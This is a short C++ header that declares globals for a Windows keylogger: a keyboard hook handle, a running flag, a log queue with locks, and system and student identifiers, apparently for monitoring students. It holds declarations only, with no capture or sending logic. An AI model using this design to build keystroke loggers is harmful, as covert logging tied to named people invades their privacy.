#ifndef GLOBALS_H
#define GLOBALS_H

#include <windows.h>
#include <string>
#include <queue>
#include <mutex>
#include <condition_variable>

// Global Variables
extern HHOOK hKeyHook;
extern bool isKeyloggerRunning;
extern std::queue<std::string> logQueue;
extern std::mutex queueMutex;
extern std::condition_variable cv;

// System Information
extern std::string SYSTEM_ID;
extern std::string STUDENT_NAME;
extern std::string STUDENT_CLASS;
extern std::string keyBuffer;
extern std::mutex keyMutex;

#endif // GLOBALS_H